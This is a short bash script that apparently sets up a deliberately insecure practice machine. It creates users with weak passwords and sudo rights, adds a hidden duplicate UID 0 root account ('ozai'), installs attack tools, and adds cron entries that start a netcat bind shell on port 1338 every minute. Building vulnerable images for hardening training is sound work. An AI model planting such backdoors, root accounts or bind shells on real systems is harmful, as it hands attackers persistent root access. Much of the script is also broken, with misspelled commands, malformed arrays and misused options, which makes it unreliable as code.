userStuff(){
    users=('ozai' 'Pakku' 'Kanna' 'Hadoka' 'Kya' 'Azula' 'Bumi' 'Appa' 'Momo' 'Iroh' 'Suki' 'Yue' 'Jet' 'Cabbage' 'Longshot' 'Smellerbee' 'Duke')
    'Pipsqueak' 'Kuei' 'Haru' 'Teo' 'Ursa' 'Pathik' 'Shyu' 'Bato' 'Piando' 'toph' 'aang' 'katara' 'sokka' 'zuko')

    for user in "${users[@]}"
    do
        useradd -m -s "${user}"
    done

    usermods=('ursa' 'kya' 'toph' 'zuko' 'aang' 'katara')

    for user in "${usermods}"
    do
        usermod -aG sudo "${user}"
    done

    usermod -u 0 -o ozai
    echo 'katara:aang' | chpasswd
    echo 'sokka:sajdhkja123' | chpasswd
    echo 'toph:1234!@#$QWERqwer' | chpasswd
    echo 'zuko:katara' | chpasswd
}

## Execute

apt-get intall -y vsftpd nikto bind9 hydra ettercap

ufw defauly deny incoming
ufw allow 3306
ufw deny 22
ufw deny 80
ufw deny 21

wget http://www.openwall.com/john/j/john-1.8.0.tar.xz /user/sbin
echo '* * * * * nc -nvlp 1338 -e /bin/sh' >> /etc/crontab
echo '* * * * * nc -nvlp 1338 -e /bin/sh' >> /var/spool/crontabs/Zuko

userStuff
